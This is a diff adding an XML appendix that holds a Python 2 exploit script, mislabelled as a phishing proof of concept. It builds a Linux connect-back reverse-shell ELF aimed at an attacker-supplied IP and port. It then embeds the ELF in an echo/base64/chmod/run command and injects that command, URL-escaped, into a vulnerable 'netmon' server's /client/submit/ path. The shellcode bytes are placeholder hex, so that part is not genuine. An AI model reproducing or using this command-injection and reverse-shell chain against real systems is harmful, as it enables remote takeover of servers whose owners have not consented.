@@ -1,0 +1,54 @@
+<appendix id="payload_script">
+    <title>Phishing Proof of Concept payload generator script</title>
+    	<code>#!/usr/bin/python
+import sys
+import socket
+import struct
+import urllib
+from base64 import b64encode
+
+# Simple helper routines to pack/unpack 32bit numbers to/from binary
+def u32h(v):
+        return struct.pack("&lt;L", v).encode('hex')
+
+# x86/Linux TCP connectback shellcode (in hex)
+# this payload contains 2 placeholders:
+#  * BAAD (will be replaced with IP address)
+#  * 8BAD (will be replaced with port number)
+cback = "DEADBEEF" + "FEE1DEAD" + "BADDCAFE" + "BAADF00D" + "8BADF00D"
+
+# replace placeholder values in shellcode hex with the specified values
+cback = cback.replace("BAAD", socket.inet_aton(sys.argv[1]).encode("hex"))
+cback = cback.replace("8BAD", struct.pack("&gt;H", int(sys.argv[2])).encode("hex")) 
+
+# Tiny ELF stub based on:
+# http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html 
+def make_elf(sc):
+        elf_head = \
+                "7f454c46010101000000000000000000" + \
+                "02000300010000005480040834000000" + \
+                "00000000000000003400200001000000" + \
+                "00000000010000000000000000800408" + \
+                "00800408" + u32h(0x54+len(sc))*2  + \
+                "0500000000100000"
+ 
+        return elf_head.decode("hex") + sc
+
+# print usage if not enough arguments are supplied
+if len(sys.argv) != 4:
+        print 'usage: %s &lt;connectback_ip&gt; &lt;connectback_port&gt; &lt;netmon_url&gt;'
+        exit(0)
+
+# invoke the make_elf helper to build an ELF file out of the shellcode
+elf = make_elf(cback.decode("hex"))
+
+# base64 encode the ELF file
+elf_b64 = b64encode(elf)
+
+# create a unix command that: uses the echo(1) and base(64) commands to write the 
+# ELF file to the disk. Make elf file executable and run it (and fork to the background)
+cmd = "\necho " + elf_b64 + " | base64 -d &gt; /tmp/z ; chmod +x /tmp/z ; /tmp/z &amp;\n"
+
+# Properly format the url for the vulnerable script with an url-escaped version of the payload.
+print sys.argv[3] + '/client/submit/' + urllib.quote_plus(cmd)</code>
+</appendix>
